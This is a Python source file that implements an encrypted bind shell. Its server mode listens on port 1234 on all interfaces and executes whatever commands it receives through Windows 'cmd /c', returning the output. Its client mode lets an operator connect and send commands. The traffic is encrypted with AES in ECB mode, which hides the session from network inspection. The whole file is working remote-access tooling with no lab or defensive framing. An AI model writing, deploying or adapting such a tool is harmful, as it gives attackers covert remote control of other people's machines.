import socket
import subprocess
import threading
import argparse
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad

DEFAULT_PORT = 1234
MAX_BUFFER_SIZE = 4096

class AESCipher:
    """Provides AES encryption and decryption functionality with ECB mode."""
    
    def __init__(self, key=None):
        """Initializes the cipher with an optional key or generates a new one."""
        self.key = key if key else get_random_bytes(32)
        self.cipher = AES.new(self.key, AES.MODE_ECB)

    def encrypt(self, plaintext):
        """Encrypts plaintext to a hex-encoded cipher text."""
        if not isinstance(plaintext, bytes):
            plaintext = plaintext.encode('latin-1')  # Ensure plaintext is in bytes
        return self.cipher.encrypt(pad(plaintext, AES.block_size)).hex()

    def decrypt(self, encrypted):
        """Decrypts a hex-encoded cipher text back to plaintext."""
        byte_data = bytearray.fromhex(encrypted)  # Convert hex string to bytes
        decrypted_data = self.cipher.decrypt(byte_data)  # Decrypt
        return unpad(decrypted_data, AES.block_size).decode('latin-1')  # Unpad and decode

    def __str__(self):
        """Returns the encryption key in hexadecimal format."""
        return "Encryption Key: {}".format(self.key.hex())

cipher = None  # Global cipher instance

def encrypted_send(socket_conn, msg):
    """Sends an encrypted message over the given socket connection."""
    if isinstance(msg, str):
        msg = msg.encode('latin-1')  # Ensure message is in bytes before encrypting
    hex_msg = cipher.encrypt(msg)  # Already returns a hex string
    socket_conn.send(hex_msg.encode('latin-1'))  # Send as encoded string

def execute_command(command):
    """Executes a system command using "cmd" and returns the output."""
    try:
        output = subprocess.check_output("cmd /c {}".format(command), stderr=subprocess.STDOUT)
    except subprocess.CalledProcessError as e:
        output = b"Command execution failed: " + e.output
    return output

def handle_client(client_socket):
    """Handles a shell session with a client."""
    encrypted_send(client_socket, b"Connection established successfully\r\n")
    try:
        while True:
            encrypted_send(client_socket, b"Please enter a command (type 'exit' to disconnect): ")
            data = client_socket.recv(MAX_BUFFER_SIZE)
            if data:
                decrypted_command = cipher.decrypt(data.decode("latin-1").strip())
                print("Received command from client:", decrypted_command)
                if not decrypted_command or decrypted_command.lower() == "exit":
                    encrypted_send(client_socket, "Session terminated. Goodbye!\r\n")
                    client_socket.close()
                    break
                command_output = execute_command(decrypted_command)
                encrypted_send(client_socket, command_output)
    except Exception as e:
        print(f"An error occurred while handling the client: {e}")
        client_socket.close()

def send_commands(client_socket):
    """Function to send commands to the remote shell."""
    try:
        while True:
            cmd = input("")  # Taking command input from user
            if cmd.strip().lower() == "exit":
                client_socket.close()
                break
            encrypted_send(client_socket, cmd)
    except Exception as e:
        print(f"Disconnected from server:", e)
        client_socket.close()

def receive_output(client_socket):
    """Function to receive output from the remote shell."""
    try:
        while True:
            hex_data = client_socket.recv(MAX_BUFFER_SIZE).decode("latin-1")
            if hex_data:
                decrypted_output = cipher.decrypt(hex_data)  # Directly pass hex string for decryption
                print(decrypted_output, end="", flush=True)
    except Exception as e:
        print(f"Disconnected from server:", e)
        client_socket.close()

def server_mode():
    """Sets up a server that listens for incoming connections and spawns a shell thread."""
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', DEFAULT_PORT))
    server_socket.listen()
    print("Initializing bind shell. Listening for incoming connections...")
    while True:
        client_socket, addr = server_socket.accept()
        print("New connection established from: {}".format(addr))
        threading.Thread(target=handle_client, args=(client_socket,)).start()

def client_mode(ip_address):
    """Connects to a remote bind shell."""
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((ip_address, DEFAULT_PORT))
    print("Successfully connected to the remote bind shell. Type your commands below:")
    # Starting threads for sending commands and receiving output
    threading.Thread(target=send_commands, args=(client_socket,)).start()
    threading.Thread(target=receive_output, args=(client_socket,)).start()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Encrypted Bind Shell Project")
    parser.add_argument("-l", "--listen", action="store_true", help="Setup a bind shell")
    parser.add_argument("-c", "--connect", help="Connect to a bind shell")
    parser.add_argument("-k", "--key", help="Encryption key in hex format", type=str, required=False)
    args = parser.parse_args()

    if args.key:
        cipher = AESCipher(bytearray.fromhex(args.key))
    else:
        cipher = AESCipher()
        if args.listen:
            print(cipher)  # Display the generated key on the server side for manual sharing

    if args.listen:
        server_mode()
    elif args.connect:
        if not args.key:
            raise ValueError("An encryption key must be provided with -k when connecting.")
        client_mode(args.connect)